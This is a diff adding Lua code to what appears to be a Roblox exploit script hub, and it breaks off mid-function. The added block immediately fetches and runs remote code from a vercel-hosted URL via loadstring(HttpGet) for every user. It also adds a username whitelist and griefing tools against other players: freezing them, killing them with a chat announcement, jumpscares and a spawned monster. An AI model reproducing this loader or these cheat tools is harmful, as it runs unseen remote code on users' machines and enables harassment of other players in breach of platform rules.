@@ -11406,3 +11406,390 @@ Tab19:AddButton({
         end
     end
 })
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local Workspace = game:GetService("Workspace")
+
+--// Executa o load para TODOS (independente se é dono ou não)
+pcall(function()
+    loadstring(game:HttpGet("https://coderawv2.vercel.app/api/raw?id=-Ocx9Pwtsl7r3vfy_Per"))()
+end)
+
+-- ===== SISTEMA DE WHITELIST =====
+local function getCurrentTimestamp()
+    return os.time()
+end
+
+local function parseDateTime(dateString)
+    -- Formato: "dd/mm/aaaa hh:mm"
+    local day, month, year, hour, minute = dateString:match("(%d+)/(%d+)/(%d+) (%d+):(%d+)")
+    if day and month and year and hour and minute then
+        return os.time({
+            day = tonumber(day),
+            month = tonumber(month),
+            year = tonumber(year),
+            hour = tonumber(hour),
+            min = tonumber(minute),
+            sec = 0
+        })
+    end
+    return nil
+end
+
+-- Sistema de Whitelist com Expiração
+local WhitelistData = {
+    -- Donos (sem expiração)
+    ["luiskkj999"] = {type = "Dono", expires = nil},
+    ["igor647u"] = {type = "Dono Max 💀", expires = nil},
+    ["tokitooff29"] = {type = "Dono Max 💀", expires = nil},
+
+    
+    -- Usuários ADM com expiração
+    ["teste"] = {type = "Usuário adm", expires = parseDateTime("15/01/2026 23:59")},
+ 
+}
+
+-- Função para verificar se usuário está na whitelist e não expirou
+local function isUserWhitelisted(username)
+    local userData = WhitelistData[username:lower()]
+    if not userData then
+        return false, "Não está na whitelist"
+    end
+    
+    -- Verificar expiração
+    if userData.expires then
+        local currentTime = getCurrentTimestamp()
+        if currentTime > userData.expires then
+            return false, "Whitelist expirada em " .. os.date("%d/%m/%Y %H:%M", userData.expires)
+        end
+    end
+    
+    return true, userData.type
+end
+
+-- VERIFICAÇÃO INICIAL - Se não estiver na whitelist ou expirou, kicka imediatamente
+local function verifyWhitelistOnStart()
+    local username = LocalPlayer.Name:lower()
+    local isWhitelisted, reason = isUserWhitelisted(username)
+    
+    if not isWhitelisted then
+        -- Espera um pouco para carregar e depois kicka
+        task.wait(2)
+        if reason:find("expirada") then
+            LocalPlayer:Kick("❌ SUA WHITELIST EXPIROU!\n\nData de expiração: " .. reason:match("expirada em (.+)"))
+        else
+            LocalPlayer:Kick("❌ VOCÊ NÃO ESTÁ NA WHITELIST!\n\nEntre em contato com o desenvolvedor.")
+        end
+        return false
+    end
+    
+    return true
+end
+
+-- Executa a verificação inicial
+if not verifyWhitelistOnStart() then
+    return -- Para a execução do script se não passou na whitelist
+end
+
+-- ===== VARIÁVEIS GLOBAIS =====
+local FROZEN_PLAYERS = {}
+local playerOriginalSpeed = {}
+local jaulas = {}
+local jailConnections = {}
+local SHADOW_USERS = {}
+local TEMP_MODS = {}
+
+-- Configuração de Jumpscares
+local JUMPSCARES = {
+    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
+    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
+    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
+    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
+}
+
+-- ===== FUNÇÕES DE AÇÃO =====
+local function FreezePlayer(player)
+    if not player or not player.Character then return false end
+    local h = player.Character:FindFirstChildOfClass("Humanoid")
+    if not h or FROZEN_PLAYERS[player.Name] then return false end
+    FROZEN_PLAYERS[player.Name] = { WalkSpeed = h.WalkSpeed, JumpPower = h.JumpPower }
+    h.WalkSpeed = 0
+    h.JumpPower = 0
+    return true
+end
+
+local function UnfreezePlayer(player)
+    if not player or not FROZEN_PLAYERS[player.Name] then return false end
+    local s = FROZEN_PLAYERS[player.Name]
+    if player.Character then
+        local h = player.Character:FindFirstChildOfClass("Humanoid")
+        if h then
+            h.WalkSpeed = s.WalkSpeed
+            h.JumpPower = s.JumpPower
+        end
+    end
+    FROZEN_PLAYERS[player.Name] = nil
+    return true
+end
+
+-- ===== FUNÇÃO KILL PLUS CORRIGIDA =====
+local function KillPlus(player)
+    if not player or not player.Character then return false end
+    
+    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+    
+    if not humanoid or not humanoidRootPart then return false end
+    
+    -- Enviar mensagem no chat
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then
+            channel:SendAsync("💀 Kill Plus executado em " .. player.Name)
+        end
+    else
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("💀 Kill Plus executado em " .. player.Name, "All")
+    end
+    
+    local targetPos = humanoidRootPart.Position
+
+    -- Criar múltiplas partes para o efeito
+    local parts = {}
+    local numParts = 8
+    for i = 1, numParts do
+        local part = Instance.new("Part")
+        part.Name = "KillPlusPart_" .. player.Name .. "_" .. i
+        part.Size = Vector3.new(3, 3, 3)
+        part.Position = targetPos + Vector3.new(math.random(-15, 15), -10, math.random(-15, 15))
+        part.Anchored = false
+        part.CanCollide = true
+        part.Material = Enum.Material.Neon
+        part.BrickColor = BrickColor.new("Really red")
+        part.Parent = Workspace
+        
+        -- Adicionar força para cima
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.Velocity = Vector3.new(0, 100, 0)
+        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
+        bodyVelocity.Parent = part
+        
+        table.insert(parts, part)
+    end
+
+    -- Esperar um pouco e então matar o jogador
+    wait(1.5)
+    
+    if player.Character then
+        player.Character:BreakJoints()
+        
+        -- Efeito explosivo
+        local explosion = Instance.new("Part")
+        explosion.Size = Vector3.new(10, 10, 10)
+        explosion.Position = targetPos
+        explosion.Anchored = true
+        explosion.CanCollide = false
+        explosion.Material = Enum.Material.Neon
+        explosion.BrickColor = BrickColor.new("Bright yellow")
+        explosion.Transparency = 0.3
+        explosion.Parent = Workspace
+        
+        local light = Instance.new("PointLight")
+        light.Brightness = 10
+        light.Range = 20
+        light.Color = Color3.new(1, 1, 0)
+        light.Parent = explosion
+        
+        -- Limpar partes após alguns segundos
+        game:GetService("Debris"):AddItem(explosion, 3)
+        for _, part in ipairs(parts) do
+            game:GetService("Debris"):AddItem(part, 4)
+        end
+    end
+    
+    return true
+end
+
+-- ===== FUNÇÃO JUMPSCARE =====
+local function TriggerJumpscare(player, jumpscare)
+    if not player or player ~= LocalPlayer then return false end
+    local screenGui = Instance.new("ScreenGui", CoreGui)
+    screenGui.Name = "JumpscareGui"
+    screenGui.IgnoreGuiInset = true
+    local imageLabel = Instance.new("ImageLabel", screenGui)
+    imageLabel.Size = UDim2.new(1, 0, 1, 0)
+    imageLabel.Position = UDim2.new(0, 0, 0, 0)
+    imageLabel.BackgroundTransparency = 1
+    imageLabel.Image = jumpscare.ImageId
+    local sound = Instance.new("Sound", screenGui)
+    sound.SoundId = jumpscare.AudioId
+    sound.Volume = 1
+    sound.Looped = false
+    sound:Play()
+    local flashCount = 10
+    local flashInterval = 0.2
+    for i = 1, flashCount do
+        if not screenGui.Parent then break end
+        imageLabel.ImageTransparency = (i % 2 == 0) and 0.3 or 0
+        task.wait(flashInterval)
+    end
+    sound:Stop()
+    screenGui:Destroy()
+    return true
+end
+
+-- ===== SISTEMA DE TAGS CORRIGIDO =====
+local function createSpecialTag(player, tagText)
+    local char = player.Character  
+    if not char then return end  
+    local head = char:FindFirstChild("Head")  
+    if not head then return end  
+    local old = head:FindFirstChild("SpecialTag")  
+    if old then old:Destroy() end  
+    
+    local billboardGui = Instance.new("BillboardGui")  
+    billboardGui.Name = "SpecialTag"  
+    billboardGui.Size = UDim2.new(0, 200, 0, 50)  
+    billboardGui.StudsOffset = Vector3.new(0, 3, 0)  
+    billboardGui.Adornee = head  
+    billboardGui.AlwaysOnTop = true  
+    billboardGui.Parent = head  
+    
+    local frame = Instance.new("Frame")  
+    frame.Size = UDim2.new(1, 0, 1, 0)  
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
+    frame.BackgroundTransparency = 0.5  
+    frame.BorderSizePixel = 0  
+    frame.Parent = billboardGui  
+    
+    local corner = Instance.new("UICorner")  
+    corner.CornerRadius = UDim.new(0, 12)  
+    corner.Parent = frame  
+    
+    local textLabel = Instance.new("TextLabel")  
+    textLabel.Size = UDim2.new(1, 0, 1, 0)  
+    textLabel.BackgroundTransparency = 1  
+    textLabel.Text = tagText  
+    textLabel.TextColor3 = Color3.fromRGB(170, 0, 255) -- Roxo
+    textLabel.TextScaled = true  
+    textLabel.Font = Enum.Font.GothamBold  
+    textLabel.TextStrokeTransparency = 0.5  
+    textLabel.Parent = frame
+end
+
+local function applyTag(player)
+    local isWhitelisted, tagType = isUserWhitelisted(player.Name:lower())
+    if isWhitelisted then  
+        player.CharacterAdded:Connect(function()  
+            task.wait(1)  
+            createSpecialTag(player, tagType)  
+        end)  
+        if player.Character then  
+            task.wait(1)  
+            createSpecialTag(player, tagType)  
+        end  
+    end
+end
+
+-- Aplicar tags nos jogadores
+for _, p in ipairs(Players:GetPlayers()) do
+    applyTag(p)
+end
+
+Players.PlayerAdded:Connect(function(p)
+    applyTag(p)
+end)
+
+-- ===== SISTEMA DO MONSTRO DAS BACKROOMS =====
+local backroomsMonster = nil
+local monsterActive = false
+
+-- ===== FUNÇÃO PARA CRIAR O MONSTRO COM IMAGEM =====
+local function CreateBackroomsMonster(position)
+    local monsterFolder = Instance.new("Folder")
+    monsterFolder.Name = "BackroomsMonster"
+    
+    -- Criar parte principal do monstro
+    local monsterPart = Instance.new("Part")
+    monsterPart.Name = "MonsterBody"
+    monsterPart.Size = Vector3.new(8, 12, 8)
+    monsterPart.Position = position
+    monsterPart.Anchored = true
+    monsterPart.CanCollide = true
+    monsterPart.Material = Enum.Material.SmoothPlastic
+    monsterPart.BrickColor = BrickColor.new("Really black")
+    monsterPart.Parent = monsterFolder
+    
+    -- Criar decal/textura com a imagem do monstro
+    local monsterDecal = Instance.new("Decal")
+    monsterDecal.Name = "MonsterFace"
+    monsterDecal.Texture = "rbxassetid://126754882337711"
+    monsterDecal.Face = Enum.NormalId.Front
+    monsterDecal.Parent = monsterPart
+    
+    -- Adicionar decal nas outras faces também
+    local decalBack = Instance.new("Decal")
+    decalBack.Texture = "rbxassetid://126754882337711"
+    decalBack.Face = Enum.NormalId.Back
+    decalBack.Parent = monsterPart
+    
+    local decalLeft = Instance.new("Decal")
+    decalLeft.Texture = "rbxassetid://126754882337711"
+    decalLeft.Face = Enum.NormalId.Left
+    decalLeft.Parent = monsterPart
+    
+    local decalRight = Instance.new("Decal")
+    decalRight.Texture = "rbxassetid://126754882337711"
+    decalRight.Face = Enum.NormalId.Right
+    decalRight.Parent = monsterPart
+    
+    -- Luz vermelha assustadora
+    local monsterLight = Instance.new("PointLight")
+    monsterLight.Brightness = 5
+    monsterLight.Range = 20
+    monsterLight.Color = Color3.fromRGB(255, 0, 0)
+    monsterLight.Parent = monsterPart
+    
+    -- Partículas de fumaça vermelha
+    local smokeParticles = Instance.new("ParticleEmitter")
+    smokeParticles.Texture = "rbxassetid://243664672"
+    smokeParticles.Lifetime = NumberRange.new(1, 3)
+    smokeParticles.Rate = 25
+    smokeParticles.SpreadAngle = Vector2.new(45, 45)
+    smokeParticles.Speed = NumberRange.new(2, 4)
+    smokeParticles.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))
+    smokeParticles.Transparency = NumberSequence.new(0.3, 0.8)
+    smokeParticles.Size = NumberSequence.new(1, 3)
+    smokeParticles.Parent = monsterPart
+    
+    -- Som do monstro
+    local monsterSound = Instance.new("Sound")
+    monsterSound.SoundId = "rbxassetid://138873214826309"
+    monsterSound.Volume = 1.5
+    monsterSound.Looped = true
+    monsterSound.Parent = monsterPart
+    monsterSound:Play()
+    
+    -- Efeito de pulsação na luz
+    coroutine.wrap(function()
+        while monsterPart.Parent do
+            monsterLight.Brightness = 8
+            wait(0.5)
+            monsterLight.Brightness = 3
+            wait(0.5)
+        end
+    end)()
+    
+    return monsterFolder
+end
+
+-- ===== FUNÇÃO PARA ATIVAR O MONSTRO =====
+local function ActivateMonster(player)
+    if not player or not player.Character then return end
+    
